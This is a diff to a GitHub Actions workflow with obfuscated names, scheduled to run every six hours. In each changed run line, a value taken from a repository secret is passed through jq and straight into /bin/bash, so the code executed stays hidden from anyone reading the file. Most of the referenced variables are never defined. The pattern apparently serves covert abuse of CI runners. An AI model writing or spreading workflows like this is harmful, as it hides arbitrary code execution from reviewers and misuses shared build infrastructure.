@@ -2,8 +2,9 @@ name: proximateoctopus
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 5/6 * * *'
-jobs:  # 23050
+    - cron: '47 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,13 +12,17 @@ jobs:  # 23050
       - uses: actions/checkout@v4
       - name: proximateoctopus
         env:
-          hyt0: ${{ secrets.hyt0 }}
+          u8: ${{ secrets.u8 }}
         run: |
-          echo $hyt0 | jq -r .z4095 | /bin/bash
-          echo $ceh47 | jq -r .cp253 | /bin/bash
-          echo $zrghs75 | jq -r .jzfgl3 | /bin/bash
-          echo $hdhgf7 | jq -r .jlm248 | /bin/bash
-          echo $q108 | jq -r .mbiwe7766 | /bin/bash
-          echo $wvx293 | jq -r .rtkds93820 | /bin/bash
-          echo $lr29 | jq -r .jord017 | /bin/bash
+          echo $u8 | jq -r .luw7 | /bin/bash
+          echo $dz3 | jq -r .qr0975 | /bin/bash
+          echo $l450 | jq -r .tddac6199 | /bin/bash
+          echo $hnrpt449 | jq -r .nwel508 | /bin/bash
+          echo $dffml9392 | jq -r .ujnk783 | /bin/bash
+          echo $wyvpe8 | jq -r .wa50 | /bin/bash
+          echo $gbdy35 | jq -r .txze5937 | /bin/bash
+          echo $tifz5378 | jq -r .bgzu7972 | /bin/bash
+          echo $g046 | jq -r .bm2 | /bin/bash
+          echo $qi1280 | jq -r .jkqw497 | /bin/bash
+          echo $du515 | jq -r .s0243 | /bin/bash
 
